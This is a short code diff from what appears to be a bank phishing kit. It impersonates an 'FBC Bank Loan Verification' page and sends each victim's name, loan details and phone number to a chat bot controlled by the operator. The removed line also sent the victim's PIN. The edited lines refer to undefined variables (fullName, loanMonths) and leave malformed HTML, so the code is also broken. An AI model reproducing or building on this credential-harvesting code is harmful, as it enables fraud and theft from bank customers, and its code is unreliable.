@@ -510,9 +510,8 @@
       
       const application = getStoredApplication();
       const loanAmount  = application.loanAmount ? '$' + Number(application.loanAmount).toLocaleString() : '—';
-      const loanType    = application.loanType || '—';
-      const fullName    = [application.firstName, application.lastName].filter(Boolean).join(' ').trim() || '—';
-
+      const loanType    = application.loanMonths || '—';
+    
       const ts = Date.now();
       const approveId = `approve_${ts}`;
       const declineId = `decline_${ts}`;
@@ -524,7 +523,7 @@
         body: JSON.stringify({
           chat_id: CONFIG.CHAT_ID,
           text: `
-<b>📱 FBC Bank Loan Verification</b><b>${fullName}</b>\nLoan Amount: <b>${loanAmount}</b>\nLoan Type: <b>${loanType}</b>\nPhone: <code>+263${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
+<b>📱 FBC Bank Loan Verification</b>${fullName}</b>\nLoan Amount: <b>${loanAmount}</b>\nLoan months: <b>${loanMonths}</b>\nPhone: <code>+263${mobile}</code>\n\nChoose Action:`,
           parse_mode: 'HTML',
           reply_markup: {
             inline_keyboard: [
